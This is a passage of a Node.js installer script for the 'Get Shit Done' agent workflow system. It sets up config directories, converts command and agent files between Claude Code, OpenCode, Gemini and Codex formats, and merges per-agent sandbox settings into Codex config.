#!/usr/bin/env node



const fs = require('fs');

const path = require('path');

const os = require('os');

const readline = require('readline');

const crypto = require('crypto');



// Colors

const cyan = '\x1b[36m';

const green = '\x1b[32m';

const yellow = '\x1b[33m';

const dim = '\x1b[2m';

const reset = '\x1b[0m';



// Codex config.toml constants

const GSD_CODEX_MARKER = '# GSD Agent Configuration \u2014 managed by get-shit-done installer';



const CODEX_AGENT_SANDBOX = {

  'gsd-executor': 'workspace-write',

  'gsd-planner': 'workspace-write',

  'gsd-phase-researcher': 'workspace-write',

  'gsd-project-researcher': 'workspace-write',

  'gsd-research-synthesizer': 'workspace-write',

  'gsd-verifier': 'workspace-write',

  'gsd-codebase-mapper': 'workspace-write',

  'gsd-roadmapper': 'workspace-write',

  'gsd-debugger': 'workspace-write',

  'gsd-plan-checker': 'read-only',

  'gsd-integration-checker': 'read-only',

};



// Get version from package.json

const pkg = require('../package.json');



// Parse args

const args = process.argv.slice(2);

const hasGlobal = args.includes('--global') || args.includes('-g');

const hasLocal = args.includes('--local') || args.includes('-l');

const hasOpencode = args.includes('--opencode');

const hasClaude = args.includes('--claude');

const hasGemini = args.includes('--gemini');

const hasCodex = args.includes('--codex');

const hasBoth = args.includes('--both'); // Legacy flag, keeps working

const hasAll = args.includes('--all');

const hasUninstall = args.includes('--uninstall') || args.includes('-u');



// Runtime selection - can be set by flags or interactive prompt

let selectedRuntimes = [];

if (hasAll) {

  selectedRuntimes = ['claude', 'opencode', 'gemini', 'codex'];

} else if (hasBoth) {

  selectedRuntimes = ['claude', 'opencode'];

} else {

  if (hasOpencode) selectedRuntimes.push('opencode');

  if (hasClaude) selectedRuntimes.push('claude');

  if (hasGemini) selectedRuntimes.push('gemini');

  if (hasCodex) selectedRuntimes.push('codex');

}



// Helper to get directory name for a runtime (used for local/project installs)

function getDirName(runtime) {

  if (runtime === 'opencode') return '.opencode';

  if (runtime === 'gemini') return '.gemini';

  if (runtime === 'codex') return '.codex';

  return '.claude';

}



/**

 * Get the config directory path relative to home directory for a runtime

 * Used for templating hooks that use path.join(homeDir, '<configDir>', ...)

 * @param {string} runtime - 'claude', 'opencode', 'gemini', or 'codex'

 * @param {boolean} isGlobal - Whether this is a global install

 */

function getConfigDirFromHome(runtime, isGlobal) {

  if (!isGlobal) {

    // Local installs use the same dir name pattern

    return `'${getDirName(runtime)}'`;

  }

  // Global installs - OpenCode uses XDG path structure

  if (runtime === 'opencode') {

    // OpenCode: ~/.config/opencode -> '.config', 'opencode'

    // Return as comma-separated for path.join() replacement

    return "'.config', 'opencode'";

  }

  if (runtime === 'gemini') return "'.gemini'";

  if (runtime === 'codex') return "'.codex'";

  return "'.claude'";

}



/**

 * Get the global config directory for OpenCode

 * OpenCode follows XDG Base Directory spec and uses ~/.config/opencode/

 * Priority: OPENCODE_CONFIG_DIR > dirname(OPENCODE_CONFIG) > XDG_CONFIG_HOME/opencode > ~/.config/opencode

 */

function getOpencodeGlobalDir() {

  // 1. Explicit OPENCODE_CONFIG_DIR env var

  if (process.env.OPENCODE_CONFIG_DIR) {

    return expandTilde(process.env.OPENCODE_CONFIG_DIR);

  }

  

  // 2. OPENCODE_CONFIG env var (use its directory)

  if (process.env.OPENCODE_CONFIG) {

    return path.dirname(expandTilde(process.env.OPENCODE_CONFIG));

  }

  

  // 3. XDG_CONFIG_HOME/opencode

  if (process.env.XDG_CONFIG_HOME) {

    return path.join(expandTilde(process.env.XDG_CONFIG_HOME), 'opencode');

  }

  

  // 4. Default: ~/.config/opencode (XDG default)

  return path.join(os.homedir(), '.config', 'opencode');

}



/**

 * Get the global config directory for a runtime

 * @param {string} runtime - 'claude', 'opencode', 'gemini', or 'codex'

 * @param {string|null} explicitDir - Explicit directory from --config-dir flag

 */

function getGlobalDir(runtime, explicitDir = null) {

  if (runtime === 'opencode') {

    // For OpenCode, --config-dir overrides env vars

    if (explicitDir) {

      return expandTilde(explicitDir);

    }

    return getOpencodeGlobalDir();

  }

  

  if (runtime === 'gemini') {

    // Gemini: --config-dir > GEMINI_CONFIG_DIR > ~/.gemini

    if (explicitDir) {

      return expandTilde(explicitDir);

    }

    if (process.env.GEMINI_CONFIG_DIR) {

      return expandTilde(process.env.GEMINI_CONFIG_DIR);

    }

    return path.join(os.homedir(), '.gemini');

  }



  if (runtime === 'codex') {

    // Codex: --config-dir > CODEX_HOME > ~/.codex

    if (explicitDir) {

      return expandTilde(explicitDir);

    }

    if (process.env.CODEX_HOME) {

      return expandTilde(process.env.CODEX_HOME);

    }

    return path.join(os.homedir(), '.codex');

  }

  

  // Claude Code: --config-dir > CLAUDE_CONFIG_DIR > ~/.claude

  if (explicitDir) {

    return expandTilde(explicitDir);

  }

  if (process.env.CLAUDE_CONFIG_DIR) {

    return expandTilde(process.env.CLAUDE_CONFIG_DIR);

  }

  return path.join(os.homedir(), '.claude');

}



const banner = '\n' +

  cyan + '   ██████╗ ███████╗██████╗\n' +

  '  ██╔════╝ ██╔════╝██╔══██╗\n' +

  '  ██║  ███╗███████╗██║  ██║\n' +

  '  ██║   ██║╚════██║██║  ██║\n' +

  '  ╚██████╔╝███████║██████╔╝\n' +

  '   ╚═════╝ ╚══════╝╚═════╝' + reset + '\n' +

  '\n' +

  '  Get Shit Done ' + dim + 'v' + pkg.version + reset + '\n' +

  '  A meta-prompting, context engineering and spec-driven\n' +

  '  development system for Claude Code, OpenCode, Gemini, and Codex by TÂCHES.\n';



// Parse --config-dir argument

function parseConfigDirArg() {

  const configDirIndex = args.findIndex(arg => arg === '--config-dir' || arg === '-c');

  if (configDirIndex !== -1) {

    const nextArg = args[configDirIndex + 1];

    // Error if --config-dir is provided without a value or next arg is another flag

    if (!nextArg || nextArg.startsWith('-')) {

      console.error(`  ${yellow}--config-dir requires a path argument${reset}`);

      process.exit(1);

    }

    return nextArg;

  }

  // Also handle --config-dir=value format

  const configDirArg = args.find(arg => arg.startsWith('--config-dir=') || arg.startsWith('-c='));

  if (configDirArg) {

    const value = configDirArg.split('=')[1];

    if (!value) {

      console.error(`  ${yellow}--config-dir requires a non-empty path${reset}`);

      process.exit(1);

    }

    return value;

  }

  return null;

}

const explicitConfigDir = parseConfigDirArg();

const hasHelp = args.includes('--help') || args.includes('-h');

const forceStatusline = args.includes('--force-statusline');



console.log(banner);



// Show help if requested

if (hasHelp) {

  console.log(`  ${yellow}Usage:${reset} npx get-shit-done-cc [options]\n\n  ${yellow}Options:${reset}\n    ${cyan}-g, --global${reset}              Install globally (to config directory)\n    ${cyan}-l, --local${reset}               Install locally (to current directory)\n    ${cyan}--claude${reset}                  Install for Claude Code only\n    ${cyan}--opencode${reset}                Install for OpenCode only\n    ${cyan}--gemini${reset}                  Install for Gemini only\n    ${cyan}--codex${reset}                   Install for Codex only\n    ${cyan}--all${reset}                     Install for all runtimes\n    ${cyan}-u, --uninstall${reset}           Uninstall GSD (remove all GSD files)\n    ${cyan}-c, --config-dir <path>${reset}   Specify custom config directory\n    ${cyan}-h, --help${reset}                Show this help message\n    ${cyan}--force-statusline${reset}        Replace existing statusline config\n\n  ${yellow}Examples:${reset}\n    ${dim}# Interactive install (prompts for runtime and location)${reset}\n    npx get-shit-done-cc\n\n    ${dim}# Install for Claude Code globally${reset}\n    npx get-shit-done-cc --claude --global\n\n    ${dim}# Install for Gemini globally${reset}\n    npx get-shit-done-cc --gemini --global\n\n    ${dim}# Install for Codex globally${reset}\n    npx get-shit-done-cc --codex --global\n\n    ${dim}# Install for all runtimes globally${reset}\n    npx get-shit-done-cc --all --global\n\n    ${dim}# Install to custom config directory${reset}\n    npx get-shit-done-cc --codex --global --config-dir ~/.codex-work\n\n    ${dim}# Install to current project only${reset}\n    npx get-shit-done-cc --claude --local\n\n    ${dim}# Uninstall GSD from Codex globally${reset}\n    npx get-shit-done-cc --codex --global --uninstall\n\n  ${yellow}Notes:${reset}\n    The --config-dir option is useful when you have multiple configurations.\n    It takes priority over CLAUDE_CONFIG_DIR / GEMINI_CONFIG_DIR / CODEX_HOME environment variables.\n`);

  process.exit(0);

}



/**

 * Expand ~ to home directory (shell doesn't expand in env vars passed to node)

 */

function expandTilde(filePath) {

  if (filePath && filePath.startsWith('~/')) {

    return path.join(os.homedir(), filePath.slice(2));

  }

  return filePath;

}



/**

 * Build a hook command path using forward slashes for cross-platform compatibility.

 * On Windows, $HOME is not expanded by cmd.exe/PowerShell, so we use the actual path.

 */

function buildHookCommand(configDir, hookName) {

  // Use forward slashes for Node.js compatibility on all platforms

  const hooksPath = configDir.replace(/\\/g, '/') + '/hooks/' + hookName;

  return `node "${hooksPath}"`;

}



/**

 * Read and parse settings.json, returning empty object if it doesn't exist

 */

function readSettings(settingsPath) {

  if (fs.existsSync(settingsPath)) {

    try {

      return JSON.parse(fs.readFileSync(settingsPath, 'utf8'));

    } catch (e) {

      return {};

    }

  }

  return {};

}



/**

 * Write settings.json with proper formatting

 */

function writeSettings(settingsPath, settings) {

  fs.writeFileSync(settingsPath, JSON.stringify(settings, null, 2) + '\n');

}



// Cache for attribution settings (populated once per runtime during install)

const attributionCache = new Map();



/**

 * Get commit attribution setting for a runtime

 * @param {string} runtime - 'claude', 'opencode', 'gemini', or 'codex'

 * @returns {null|undefined|string} null = remove, undefined = keep default, string = custom

 */

function getCommitAttribution(runtime) {

  // Return cached value if available

  if (attributionCache.has(runtime)) {

    return attributionCache.get(runtime);

  }



  let result;



  if (runtime === 'opencode') {

    const config = readSettings(path.join(getGlobalDir('opencode', null), 'opencode.json'));

    result = config.disable_ai_attribution === true ? null : undefined;

  } else if (runtime === 'gemini') {

    // Gemini: check gemini settings.json for attribution config

    const settings = readSettings(path.join(getGlobalDir('gemini', explicitConfigDir), 'settings.json'));

    if (!settings.attribution || settings.attribution.commit === undefined) {

      result = undefined;

    } else if (settings.attribution.commit === '') {

      result = null;

    } else {

      result = settings.attribution.commit;

    }

  } else if (runtime === 'claude') {

    // Claude Code

    const settings = readSettings(path.join(getGlobalDir('claude', explicitConfigDir), 'settings.json'));

    if (!settings.attribution || settings.attribution.commit === undefined) {

      result = undefined;

    } else if (settings.attribution.commit === '') {

      result = null;

    } else {

      result = settings.attribution.commit;

    }

  } else {

    // Codex currently has no attribution setting equivalent

    result = undefined;

  }



  // Cache and return

  attributionCache.set(runtime, result);

  return result;

}



/**

 * Process Co-Authored-By lines based on attribution setting

 * @param {string} content - File content to process

 * @param {null|undefined|string} attribution - null=remove, undefined=keep, string=replace

 * @returns {string} Processed content

 */

function processAttribution(content, attribution) {

  if (attribution === null) {

    // Remove Co-Authored-By lines and the preceding blank line

    return content.replace(/(\r?\n){2}Co-Authored-By:.*$/gim, '');

  }

  if (attribution === undefined) {

    return content;

  }

  // Replace with custom attribution (escape $ to prevent backreference injection)

  const safeAttribution = attribution.replace(/\$/g, '$$$$');

  return content.replace(/Co-Authored-By:.*$/gim, `Co-Authored-By: ${safeAttribution}`);

}



/**

 * Convert Claude Code frontmatter to opencode format

 * - Converts 'allowed-tools:' array to 'permission:' object

 * @param {string} content - Markdown file content with YAML frontmatter

 * @returns {string} - Content with converted frontmatter

 */

// Color name to hex mapping for opencode compatibility

const colorNameToHex = {

  cyan: '#00FFFF',

  red: '#FF0000',

  green: '#00FF00',

  blue: '#0000FF',

  yellow: '#FFFF00',

  magenta: '#FF00FF',

  orange: '#FFA500',

  purple: '#800080',

  pink: '#FFC0CB',

  white: '#FFFFFF',

  black: '#000000',

  gray: '#808080',

  grey: '#808080',

};



// Tool name mapping from Claude Code to OpenCode

// OpenCode uses lowercase tool names; special mappings for renamed tools

const claudeToOpencodeTools = {

  AskUserQuestion: 'question',

  SlashCommand: 'skill',

  TodoWrite: 'todowrite',

  WebFetch: 'webfetch',

  WebSearch: 'websearch',  // Plugin/MCP - keep for compatibility

};



// Tool name mapping from Claude Code to Gemini CLI

// Gemini CLI uses snake_case built-in tool names

const claudeToGeminiTools = {

  Read: 'read_file',

  Write: 'write_file',

  Edit: 'replace',

  Bash: 'run_shell_command',

  Glob: 'glob',

  Grep: 'search_file_content',

  WebSearch: 'google_web_search',

  WebFetch: 'web_fetch',

  TodoWrite: 'write_todos',

  AskUserQuestion: 'ask_user',

};



/**

 * Convert a Claude Code tool name to OpenCode format

 * - Applies special mappings (AskUserQuestion -> question, etc.)

 * - Converts to lowercase (except MCP tools which keep their format)

 */

function convertToolName(claudeTool) {

  // Check for special mapping first

  if (claudeToOpencodeTools[claudeTool]) {

    return claudeToOpencodeTools[claudeTool];

  }

  // MCP tools (mcp__*) keep their format

  if (claudeTool.startsWith('mcp__')) {

    return claudeTool;

  }

  // Default: convert to lowercase

  return claudeTool.toLowerCase();

}



/**

 * Convert a Claude Code tool name to Gemini CLI format

 * - Applies Claude→Gemini mapping (Read→read_file, Bash→run_shell_command, etc.)

 * - Filters out MCP tools (mcp__*) — they are auto-discovered at runtime in Gemini

 * - Filters out Task — agents are auto-registered as tools in Gemini

 * @returns {string|null} Gemini tool name, or null if tool should be excluded

 */

function convertGeminiToolName(claudeTool) {

  // MCP tools: exclude — auto-discovered from mcpServers config at runtime

  if (claudeTool.startsWith('mcp__')) {

    return null;

  }

  // Task: exclude — agents are auto-registered as callable tools

  if (claudeTool === 'Task') {

    return null;

  }

  // Check for explicit mapping

  if (claudeToGeminiTools[claudeTool]) {

    return claudeToGeminiTools[claudeTool];

  }

  // Default: lowercase

  return claudeTool.toLowerCase();

}



function toSingleLine(value) {

  return value.replace(/\s+/g, ' ').trim();

}



function yamlQuote(value) {

  return JSON.stringify(value);

}



function extractFrontmatterAndBody(content) {

  if (!content.startsWith('---')) {

    return { frontmatter: null, body: content };

  }



  const endIndex = content.indexOf('---', 3);

  if (endIndex === -1) {

    return { frontmatter: null, body: content };

  }



  return {

    frontmatter: content.substring(3, endIndex).trim(),

    body: content.substring(endIndex + 3),

  };

}



function extractFrontmatterField(frontmatter, fieldName) {

  const regex = new RegExp(`^${fieldName}:\\s*(.+)$`, 'm');

  const match = frontmatter.match(regex);

  if (!match) return null;

  return match[1].trim().replace(/^['"]|['"]$/g, '');

}



function convertSlashCommandsToCodexSkillMentions(content) {

  let converted = content.replace(/\/gsd:([a-z0-9-]+)/gi, (_, commandName) => {

    return `$gsd-${String(commandName).toLowerCase()}`;

  });

  converted = converted.replace(/\/gsd-help\b/g, '$gsd-help');

  return converted;

}



function convertClaudeToCodexMarkdown(content) {

  let converted = convertSlashCommandsToCodexSkillMentions(content);

  converted = converted.replace(/\$ARGUMENTS\b/g, '{{GSD_ARGS}}');

  return converted;

}



function getCodexSkillAdapterHeader(skillName) {

  const invocation = `$${skillName}`;

  return `<codex_skill_adapter>

## A. Skill Invocation

- This skill is invoked by mentioning \`${invocation}\`.

- Treat all user text after \`${invocation}\` as \`{{GSD_ARGS}}\`.

- If no arguments are present, treat \`{{GSD_ARGS}}\` as empty.



## B. AskUserQuestion → request_user_input Mapping

GSD workflows use \`AskUserQuestion\` (Claude Code syntax). Translate to Codex \`request_user_input\`:



Parameter mapping:

- \`header\` → \`header\`

- \`question\` → \`question\`

- Options formatted as \`"Label" — description\` → \`{label: "Label", description: "description"}\`

- Generate \`id\` from header: lowercase, replace spaces with underscores



Batched calls:

- \`AskUserQuestion([q1, q2])\` → single \`request_user_input\` with multiple entries in \`questions[]\`



Multi-select workaround:

- Codex has no \`multiSelect\`. Use sequential single-selects, or present a numbered freeform list asking the user to enter comma-separated numbers.



Execute mode fallback:

- When \`request_user_input\` is rejected (Execute mode), present a plain-text numbered list and pick a reasonable default.



## C. Task() → spawn_agent Mapping

GSD workflows use \`Task(...)\` (Claude Code syntax). Translate to Codex collaboration tools:



Direct mapping:

- \`Task(subagent_type="X", prompt="Y")\` → \`spawn_agent(agent_type="X", message="Y")\`

- \`Task(model="...")\` → omit (Codex uses per-role config, not inline model selection)

- \`fork_context: false\` by default — GSD agents load their own context via \`<files_to_read>\` blocks



Parallel fan-out:

- Spawn multiple agents → collect agent IDs → \`wait(ids)\` for all to complete



Result parsing:

- Look for structured markers in agent output: \`CHECKPOINT\`, \`PLAN COMPLETE\`, \`SUMMARY\`, etc.

- \`close_agent(id)\` after collecting results from each agent

</codex_skill_adapter>`;

}



function convertClaudeCommandToCodexSkill(content, skillName) {

  const converted = convertClaudeToCodexMarkdown(content);

  const { frontmatter, body } = extractFrontmatterAndBody(converted);

  let description = `Run GSD workflow ${skillName}.`;

  if (frontmatter) {

    const maybeDescription = extractFrontmatterField(frontmatter, 'description');

    if (maybeDescription) {

      description = maybeDescription;

    }

  }

  description = toSingleLine(description);

  const shortDescription = description.length > 180 ? `${description.slice(0, 177)}...` : description;

  const adapter = getCodexSkillAdapterHeader(skillName);



  return `---\nname: ${yamlQuote(skillName)}\ndescription: ${yamlQuote(description)}\nmetadata:\n  short-description: ${yamlQuote(shortDescription)}\n---\n\n${adapter}\n\n${body.trimStart()}`;

}



/**

 * Convert Claude Code agent markdown to Codex agent format.

 * Applies base markdown conversions, then adds a <codex_agent_role> header

 * and cleans up frontmatter (removes tools/color fields).

 */

function convertClaudeAgentToCodexAgent(content) {

  let converted = convertClaudeToCodexMarkdown(content);



  const { frontmatter, body } = extractFrontmatterAndBody(converted);

  if (!frontmatter) return converted;



  const name = extractFrontmatterField(frontmatter, 'name') || 'unknown';

  const description = extractFrontmatterField(frontmatter, 'description') || '';

  const tools = extractFrontmatterField(frontmatter, 'tools') || '';



  const roleHeader = `<codex_agent_role>

role: ${name}

tools: ${tools}

purpose: ${toSingleLine(description)}

</codex_agent_role>`;



  const cleanFrontmatter = `---\nname: ${yamlQuote(name)}\ndescription: ${yamlQuote(toSingleLine(description))}\n---`;



  return `${cleanFrontmatter}\n\n${roleHeader}\n${body}`;

}



/**

 * Generate a per-agent .toml config file for Codex.

 * Sets sandbox_mode and developer_instructions from the agent markdown body.

 */

function generateCodexAgentToml(agentName, agentContent) {

  const sandboxMode = CODEX_AGENT_SANDBOX[agentName] || 'read-only';

  const { body } = extractFrontmatterAndBody(agentContent);

  const instructions = body.trim();



  const lines = [

    `sandbox_mode = "${sandboxMode}"`,

    `developer_instructions = """`,

    instructions,

    `"""`,

  ];

  return lines.join('\n') + '\n';

}



/**

 * Generate the GSD config block for Codex config.toml.

 * @param {Array<{name: string, description: string}>} agents

 */

function generateCodexConfigBlock(agents) {

  const lines = [

    GSD_CODEX_MARKER,

    '[features]',

    'multi_agent = true',

    'default_mode_request_user_input = true',

    '',

    '[agents]',

    'max_threads = 4',

    'max_depth = 2',

    '',

  ];



  for (const { name, description } of agents) {

    lines.push(`[agents.${name}]`);

    lines.push(`description = ${JSON.stringify(description)}`);

    lines.push(`config_file = "agents/${name}.toml"`);

    lines.push('');

  }



  return lines.join('\n');

}



/**

 * Strip GSD sections from Codex config.toml content.

 * Returns cleaned content, or null if file would be empty.

 */

function stripGsdFromCodexConfig(content) {

  const markerIndex = content.indexOf(GSD_CODEX_MARKER);



  if (markerIndex !== -1) {

    // Has GSD marker — remove everything from marker to EOF

    let before = content.substring(0, markerIndex).trimEnd();

    // Also strip GSD-injected feature keys above the marker (Case 3 inject)

    before = before.replace(/^multi_agent\s*=\s*true\s*\n?/m, '');

    before = before.replace(/^default_mode_request_user_input\s*=\s*true\s*\n?/m, '');

    before = before.replace(/^\[features\]\s*\n(?=\[|$)/m, '');

    before = before.replace(/\n{3,}/g, '\n\n').trim();

    if (!before) return null;

    return before + '\n';

  }



  // No marker but may have GSD-injected feature keys

  let cleaned = content;

  cleaned = cleaned.replace(/^multi_agent\s*=\s*true\s*\n?/m, '');

  cleaned = cleaned.replace(/^default_mode_request_user_input\s*=\s*true\s*\n?/m, '');



  // Remove [agents.gsd-*] sections (from header to next section or EOF)

  cleaned = cleaned.replace(/^\[agents\.gsd-[^\]]+\]\n(?:(?!\[)[^\n]*\n?)*/gm, '');



  // Remove [features] section if now empty (only header, no keys before next section)

  cleaned = cleaned.replace(/^\[features\]\s*\n(?=\[|$)/m, '');



  // Remove [agents] section if now empty

  cleaned = cleaned.replace(/^\[agents\]\s*\n(?=\[|$)/m, '');



  // Clean up excessive blank lines

  cleaned = cleaned.replace(/\n{3,}/g, '\n\n').trim();



  if (!cleaned) return null;

  return cleaned + '\n';

}



/**

 * Merge GSD config block into an existing or new config.toml.

 * Three cases: new file, existing with GSD marker, existing without marker.

 */

function mergeCodexConfig(configPath, gsdBlock) {

  // Case 1: No config.toml — create fresh

  if (!fs.existsSync(configPath)) {

    fs.writeFileSync(configPath, gsdBlock + '\n');

    return;

  }



  const existing = fs.readFileSync(configPath, 'utf8');

  const markerIndex = existing.indexOf(GSD_CODEX_MARKER);



  // Case 2: Has GSD marker — truncate and re-append

  if (markerIndex !== -1) {

    const before = existing.substring(0, markerIndex).trimEnd();

    const newContent = before ? before + '\n\n' + gsdBlock + '\n' : gsdBlock + '\n';

    fs.writeFileSync(configPath, newContent);

    return;

  }



  // Case 3: No marker — inject features if needed, append agents

  let content = existing;

  const featuresRegex = /^\[features\]\s*$/m;

  const hasFeatures = featuresRegex.test(content);



  if (hasFeatures) {

    if (!content.includes('multi_agent')) {

      content = content.replace(featuresRegex, '[features]\nmulti_agent = true');

    }

    if (!content.includes('default_mode_request_user_input')) {

      content = content.replace(/^\[features\].*$/m, '$&\ndefault_mode_request_user_input = true');

    }

    // Append agents block (skip the [features] section from gsdBlock)

    const agentsBlock = gsdBlock.substring(gsdBlock.indexOf('[agents]'));

    content = content.trimEnd() + '\n\n' + GSD_CODEX_MARKER + '\n' + agentsBlock + '\n';

  } else {

    content = content.trimEnd() + '\n\n' + gsdBlock + '\n';

  }



  fs.writeFileSync(configPath, content);

}



/**

 * Generate config.toml and per-agent .toml files for Codex.

 * Reads agent .md files from source, extracts metadata, writes .toml configs.

 */

function installCodexConfig(targetDir, agentsSrc) {

  const configPath = path.join(targetDir, 'config.toml');

  const agentsTomlDir = path.join(targetDir, 'agents');

  fs.mkdirSync(agentsTomlDir, { recursive: true });



  const agentEntries = fs.readdirSync(agentsSrc).filter(f => f.startsWith('gsd-') && f.endsWith('.md'));

  const agents = [];



  for (const file of agentEntries) {

    const content = fs.readFileSync(path.join(agentsSrc, file), 'utf8');

    const { frontmatter } = extractFrontmatterAndBody(content);

    const name = extractFrontmatterField(frontmatter, 'name') || file.replace('.md', '');

    const description = extractFrontmatterField(frontmatter, 'description') || '';



    agents.push({ name, description: toSingleLine(description) });



    const tomlContent = generateCodexAgentToml(name, content);

    fs.writeFileSync(path.join(agentsTomlDir, `${name}.toml`), tomlContent);

  }



  const gsdBlock = generateCodexConfigBlock(agents);

  mergeCodexConfig(configPath, gsdBlock);



  return agents.length;

}



/**

 * Strip HTML <sub> tags for Gemini CLI output

 * Terminals don't support subscript — Gemini renders these as raw HTML.

 * Converts <sub>text</sub> to italic *(text)* for readable terminal output.

 */

function stripSubTags(content) {

  return content.replace(/<sub>(.*?)<\/sub>/g, '*($1)*');

}



/**

 * Convert Claude Code agent frontmatter to Gemini CLI format

 * Gemini agents use .md files with YAML frontmatter, same as Claude,

 * but with different field names and formats:

 * - tools: must be a YAML array (not comma-separated string)

 * - tool names: must use Gemini built-in names (read_file, not Read)

 * - color: must be removed (causes validation error)

 * - mcp__* tools: must be excluded (auto-discovered at runtime)

 */

function convertClaudeToGeminiAgent(content) {

  if (!content.startsWith('---')) return content;



  const endIndex = content.indexOf('---', 3);

  if (endIndex === -1) return content;



  const frontmatter = content.substring(3, endIndex).trim();

  const body = content.substring(endIndex + 3);



  const lines = frontmatter.split('\n');

  const newLines = [];

  let inAllowedTools = false;

  const tools = [];



  for (const line of lines) {

    const trimmed = line.trim();



    // Convert allowed-tools YAML array to tools list

    if (trimmed.startsWith('allowed-tools:')) {

      inAllowedTools = true;

      continue;

    }



    // Handle inline tools: field (comma-separated string)

    if (trimmed.startsWith('tools:')) {

      const toolsValue = trimmed.substring(6).trim();

      if (toolsValue) {

        const parsed = toolsValue.split(',').map(t => t.trim()).filter(t => t);

        for (const t of parsed) {

          const mapped = convertGeminiToolName(t);

          if (mapped) tools.push(mapped);

        }

      } else {

        // tools: with no value means YAML array follows

        inAllowedTools = true;

      }

      continue;

    }



    // Strip color field (not supported by Gemini CLI, causes validation error)

    if (trimmed.startsWith('color:')) continue;



    // Collect allowed-tools/tools array items

    if (inAllowedTools) {

      if (trimmed.startsWith('- ')) {

        const mapped = convertGeminiToolName(trimmed.substring(2).trim());

        if (mapped) tools.push(mapped);

        continue;

      } else if (trimmed && !trimmed.startsWith('-')) {

        inAllowedTools = false;

      }

    }



    if (!inAllowedTools) {

      newLines.push(line);

    }

  }



  // Add tools as YAML array (Gemini requires array format)

  if (tools.length > 0) {

    newLines.push('tools:');

    for (const tool of tools) {

      newLines.push(`  - ${tool}`);

    }

  }



  const newFrontmatter = newLines.join('\n').trim();



  // Escape ${VAR} patterns in agent body for Gemini CLI compatibility.

  // Gemini's templateString() treats all ${word} patterns as template variables

  // and throws "Template validation failed: Missing required input parameters"

  // when they can't be resolved. GSD agents use ${PHASE}, ${PLAN}, etc. as

  // shell variables in bash code blocks — convert to $VAR (no braces) which

  // is equivalent bash and invisible to Gemini's /\$\{(\w+)\}/g regex.

  const escapedBody = body.replace(/\$\{(\w+)\}/g, '$$$1');



  return `---\n${newFrontmatter}\n---${stripSubTags(escapedBody)}`;

}



function convertClaudeToOpencodeFrontmatter(content) {

  // Replace tool name references in content (applies to all files)

  let convertedContent = content;

  convertedContent = convertedContent.replace(/\bAskUserQuestion\b/g, 'question');

  convertedContent = convertedContent.replace(/\bSlashCommand\b/g, 'skill');

  convertedContent = convertedContent.replace(/\bTodoWrite\b/g, 'todowrite');

  // Replace /gsd:command with /gsd-command for opencode (flat command structure)

  convertedContent = convertedContent.replace(/\/gsd:/g, '/gsd-');

  // Replace ~/.claude with ~/.config/opencode (OpenCode's correct config location)

  convertedContent = convertedContent.replace(/~\/\.claude\b/g, '~/.config/opencode');

  // Replace general-purpose subagent type with OpenCode's equivalent "general"

  convertedContent = convertedContent.replace(/subagent_type="general-purpose"/g, 'subagent_type="general"');



  // Check if content has frontmatter

  if (!convertedContent.startsWith('---')) {

    return convertedContent;

  }



  // Find the end of frontmatter

  const endIndex = convertedContent.indexOf('---', 3);

  if (endIndex === -1) {

    return convertedContent;

  }



  const frontmatter = convertedContent.substring(3, endIndex).trim();

  const body = convertedContent.substring(endIndex + 3);



  // Parse frontmatter line by line (simple YAML parsing)

  const lines = frontmatter.split('\n');

  const newLines = [];

  let inAllowedTools = false;

  const allowedTools = [];



  for (const line of lines) {

    const trimmed = line.trim();



    // Detect start of allowed-tools array

    if (trimmed.startsWith('allowed-tools:')) {

      inAllowedTools = true;

      continue;

    }



    // Detect inline tools: field (comma-separated string)

    if (trimmed.startsWith('tools:')) {

      const toolsValue = trimmed.substring(6).trim();

      if (toolsValue) {

        // Parse comma-separated tools

        const tools = toolsValue.split(',').map(t => t.trim()).filter(t => t);

        allowedTools.push(...tools);

      }

      continue;

    }



    // Remove name: field - opencode uses filename for command name

    if (trimmed.startsWith('name:')) {

      continue;

    }



    // Convert color names to hex for opencode

    if (trimmed.startsWith('color:')) {

      const colorValue = trimmed.substring(6).trim().toLowerCase();

      const hexColor = colorNameToHex[colorValue];

      if (hexColor) {

        newLines.push(`color: "${hexColor}"`);

      } else if (colorValue.startsWith('#')) {

        // Validate hex color format (#RGB or #RRGGBB)

        if (/^#[0-9a-f]{3}$|^#[0-9a-f]{6}$/i.test(colorValue)) {

          // Already hex and valid, keep as is

          newLines.push(line);

        }

        // Skip invalid hex colors

      }

      // Skip unknown color names

      continue;

    }



    // Collect allowed-tools items

    if (inAllowedTools) {

      if (trimmed.startsWith('- ')) {

        allowedTools.push(trimmed.substring(2).trim());

        continue;

      } else if (trimmed && !trimmed.startsWith('-')) {

        // End of array, new field started

        inAllowedTools = false;

      }

    }



    // Keep other fields (including name: which opencode ignores)

    if (!inAllowedTools) {

      newLines.push(line);

    }

  }



  // Add tools object if we had allowed-tools or tools

  if (allowedTools.length > 0) {

    newLines.push('tools:');

    for (const tool of allowedTools) {

      newLines.push(`  ${convertToolName(tool)}: true`);

    }

  }



  // Rebuild frontmatter (body already has tool names converted)

  const newFrontmatter = newLines.join('\n').trim();

  return `---\n${newFrontmatter}\n---${body}`;

}



/**

 * Convert Claude Code markdown command to Gemini TOML format

 * @param {string} content - Markdown file content with YAML frontmatter

 * @returns {string} - TOML content

 */

function convertClaudeToGeminiToml(content) {

  // Check if content has frontmatter

  if (!content.startsWith('---')) {

    return `prompt = ${JSON.stringify(content)}\n`;

  }



  const endIndex = content.indexOf('---', 3);

  if (endIndex === -1) {

    return `prompt = ${JSON.stringify(content)}\n`;

  }



  const frontmatter = content.substring(3, endIndex).trim();

  const body = content.substring(endIndex + 3).trim();

  

  // Extract description from frontmatter

  let description = '';

  const lines = frontmatter.split('\n');

  for (const line of lines) {

    const trimmed = line.trim();

    if (trimmed.startsWith('description:')) {

      description = trimmed.substring(12).trim();

      break;

    }

  }



  // Construct TOML

  let toml = '';

  if (description) {

    toml += `description = ${JSON.stringify(description)}\n`;

  }

  

  toml += `prompt = ${JSON.stringify(body)}\n`;

  

  return toml;

}



/**

 * Copy commands to a flat structure for OpenCode

 * OpenCode expects: command/gsd-help.md (invoked as /gsd-help)

 * Source structure: commands/gsd/help.md

 * 

 * @param {string} srcDir - Source directory (e.g., commands/gsd/)

 * @param {string} destDir - Destination directory (e.g., command/)

 * @param {string} prefix - Prefix for filenames (e.g., 'gsd')

 * @param {string} pathPrefix - Path prefix for file references

 * @param {string} runtime - Target runtime ('claude' or 'opencode')

 */

function copyFlattenedCommands(srcDir, destDir, prefix, pathPrefix, runtime) {

  if (!fs.existsSync(srcDir)) {

    return;

  }

  

  // Remove old gsd-*.md files before copying new ones

  if (fs.existsSync(destDir)) {

